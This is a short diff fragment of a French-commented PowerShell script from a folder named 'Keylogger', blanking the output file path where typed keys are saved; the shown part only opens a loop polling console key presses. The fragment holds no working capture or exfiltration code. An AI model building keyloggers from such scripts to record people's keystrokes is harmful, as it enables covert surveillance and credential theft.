@@ -1,5 +1,5 @@
 ﻿#chemin vers le fichier où est stocker ce qui est écrit
-$path = "W:\Pole_STS\unite_SPT\Apprenti\joseph\Scripts & Developpement\Keylogger\test.txt"
+$path = ""
 
 while (1) {
     if ([Console]::KeyAvailable){
